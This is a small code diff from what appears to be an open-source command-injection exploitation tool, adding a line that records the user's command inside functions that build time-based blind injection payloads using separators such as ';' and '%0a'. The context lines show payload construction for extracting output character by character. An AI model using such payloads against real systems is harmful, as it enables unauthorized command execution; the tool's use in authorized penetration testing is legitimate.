@@ -244,6 +244,7 @@ def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_reque
                 "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                 )
   else:
+    settings.USER_APPLIED_CMD = cmd
     if separator == ";" or separator == "%0a":
       payload = (separator +
                  # Find the length of the output, using readline().
@@ -385,6 +386,7 @@ def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http
                 "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                 )
   else:
+    settings.USER_APPLIED_CMD = cmd
     if separator == ";" or separator == "%0a":
       payload = (separator +
                  "str=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(ord(\'" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "]))\nexit(0)\"" + settings.CMD_SUB_SUFFIX + separator +
